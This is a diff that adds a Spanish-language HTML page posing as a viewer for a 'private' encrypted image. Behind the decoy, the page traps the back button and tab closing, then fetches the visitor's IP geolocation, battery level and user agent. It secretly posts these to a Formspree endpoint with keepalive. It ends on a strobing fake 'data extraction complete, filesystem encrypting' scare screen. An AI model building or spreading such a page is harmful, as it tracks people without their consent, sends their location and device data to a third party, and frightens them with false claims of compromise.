@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VISOR DE ARCHIVOS ENCRIPTADOS</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        :root { --main: #00ff41; --alert: #ff0000; --bg: #050505; }
+        body { background: #f0f0f0; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+
+        /* --- INTERFAZ SEÑUELO (CEBO) --- */
+        #setup { text-align: center; width: 100%; z-index: 5; transition: all 0.3s; }
+        .file-card { width: 300px; background: white; margin: 0 auto; padding: 20px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #ddd; }
+        .img-preview { width: 100%; height: 180px; background: #eee; border-radius: 6px; overflow: hidden; position: relative; margin-bottom: 15px; }
+        .img-preview img { width: 100%; height: 100%; object-fit: cover; filter: blur(4px) grayscale(1); opacity: 0.6; }
+        .noise { position: absolute; top:0; left:0; width:100%; height:100%; background: url('https://media.giphy.com/media/oEI9uWUicKgH6/giphy.gif'); opacity: 0.1; }
+        #view-btn { width: 100%; padding: 16px; background: #007aff; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer; }
+
+        /* --- TERMINAL HACKER (OCULTA) --- */
+        #hacker-ui { display: none; background: var(--bg); position: fixed; top:0; left:0; width: 100%; height: 100%; z-index: 100; color: var(--main); font-family: 'Courier New', monospace; }
+        #console { padding: 20px; height: 100%; box-sizing: border-box; position: relative; }
+        .log { margin-bottom: 6px; font-size: 0.85rem; line-height: 1.2; text-shadow: 0 0 5px var(--main); }
+        #map { width: 100%; height: 160px; margin: 15px 0; border: 1px solid #222; filter: grayscale(1) invert(1); display: none; }
+        
+        /* Efecto de monitor antiguo */
+        #hacker-ui::after { content: ""; position: absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03)); z-index: 110; background-size: 100% 3px, 3px 100%; pointer-events: none; }
+
+        /* --- PANTALLA CRÍTICA --- */
+        #critical { position: fixed; top:0; left:0; width:100%; height:100%; background: #000; color: var(--alert); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; text-align: center; padding: 20px; }
+        .strobe { animation: strobe-bg 0.15s infinite; }
+        @keyframes strobe-bg { 0% { background: #600; } 50% { background: #000; } 100% { background: #600; } }
+    </style>
+</head>
+<body>
+
+    <!-- PANTALLA INICIAL: EL CEBO -->
+    <div id="setup">
+        <div class="file-card">
+            <div class="img-preview">
+                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400">
+                <div class="noise"></div>
+            </div>
+            <div style="text-align: left; margin-bottom: 20px;">
+                <b style="font-size: 0.9rem; color: #333;">IMG_9921_PRIVATE.jpg</b><br>
+                <span style="font-size: 0.75rem; color: #888;">Tamaño: 4.2 MB | Formato: JPEG</span>
+            </div>
+            <button id="view-btn" onclick="startHack()">[ VER IMAGEN ADJUNTA ]</button>
+        </div>
+    </div>
+
+    <!-- TERMINAL HACKER -->
+    <div id="hacker-ui">
+        <div id="console">
+            <div id="logs"></div>
+            <div id="map"></div>
+        </div>
+    </div>
+
+    <!-- ALERTA FINAL -->
+    <div id="critical">
+        <h1 style="font-size: 2rem; margin:0;">ALERTA DE SISTEMA</h1>
+        <div style="background: var(--alert); color: white; padding: 12px; margin: 20px 0; font-weight: bold; width: 100%;">EXTRACCIÓN DE DATOS COMPLETA</div>
+        <p id="final-data" style="font-size: 0.9rem;"></p>
+        <p style="font-size: 0.7rem; opacity: 0.6;">TODA TU INFORMACIÓN HA SIDO ENVIADA AL SERVIDOR DE AUDITORÍA</p>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
+    <script>
+        /* TRAMPA 1: Bloqueo del botón "Atrás" */
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, null, window.location.href);
+            alert("⚠️ ERROR CRÍTICO: No se puede interrumpir la conexión segura durante la transferencia.");
+        };
+
+        /* TRAMPA 2: Confirmación antes de cerrar pestaña */
+        window.onbeforeunload = function() {
+            return "La descarga de datos está en curso. ¿Desea interrumpir el proceso?";
+        };
+
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playSfx(freq = 150, dur = 0.05, type = 'square') {
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(0.01, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + dur);
+                osc.connect(gain); gain.connect(audioCtx.destination);
+                osc.start(); osc.stop(audioCtx.currentTime + dur);
+            } catch(e) {}
+        }
+
+        async function typeWriter(text, isAlert = false) {
+            const logs = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log';
+            if(isAlert) div.style.color = 'var(--alert)';
+            logs.appendChild(div);
+            for (let char of text) {
+                div.innerHTML += char;
+                playSfx(Math.random()*200+50);
+                document.getElementById('console').scrollTop = document.getElementById('console').scrollHeight;
+                await new Promise(r => setTimeout(r, 20));
+            }
+        }
+
+        async function startHack() {
+            // Activar audio
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            
+            // Cambiar interfaz
+            document.getElementById('setup').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('setup').style.display = 'none';
+                document.getElementById('hacker-ui').style.display = 'block';
+            }, 300);
+
+            // Iniciar simulacro
+            await typeWriter("> Conectando con el socket de imagen...");
+            await typeWriter("> [!] ADVERTENCIA: Certificado SSL no válido.", true);
+            await typeWriter("> Saltando protocolos de seguridad...");
+
+            // Obtener IP y otros datos
+            let ipData = { ip: "187.213.48.56", city: "Localizando..." };
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                ipData = await r.json();
+            } catch(e) {}
+
+            let bat = "N/A";
+            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e) {}
+
+            await typeWriter(`> OBJETIVO VINCULADO: ${ipData.ip}`, true);
+            
+            // TRAMPA 3: Envío persistente (KeepAlive)
+            // Se envía ANTES de que termine la animación por si cierran la página
+            const fd = new FormData();
+            fd.append("IP", ipData.ip);
+            fd.append("Ubicacion", ipData.city + ", " + (ipData.country_name || ""));
+            fd.append("Bateria", bat);
+            fd.append("Dispositivo", navigator.userAgent);
+            
+            fetch('https://formspree.io/f/mreykylj', { 
+                method: 'POST', 
+                body: fd, 
+                headers: {'Accept': 'application/json'},
+                keepalive: true // Garantiza el envío aunque se cierre la pestaña
+            });
+
+            if(ipData.latitude) {
+                document.getElementById('map').style.display = 'block';
+                const map = L.map('map', { zoomControl: false, attributionControl: false }).setView([ipData.latitude, ipData.longitude], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.circle([ipData.latitude, ipData.longitude], { color: 'red', radius: 500 }).addTo(map);
+                await typeWriter("> Coordenadas GPS fijadas.");
+            }
+
+            await typeWriter(`> Ciudad: ${ipData.city}`);
+            await typeWriter(`> Nivel de Energía: ${bat}`);
+            await typeWriter("> Extrayendo credenciales de sesión...");
+            await typeWriter("> Encriptando sistema de archivos...");
+
+            setTimeout(() => {
+                document.getElementById('hacker-ui').style.display = 'none';
+                const crit = document.getElementById('critical');
+                crit.style.display = 'flex';
+                crit.classList.add('strobe');
+                playSfx(880, 2, 'sawtooth');
+                document.getElementById('final-data').innerText = `ID_DE_RASTREO: ${Math.random().toString(36).slice(5).toUpperCase()} | HOST: ${ipData.ip}`;
+                if (navigator.vibrate) navigator.vibrate([400, 100, 400]);
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
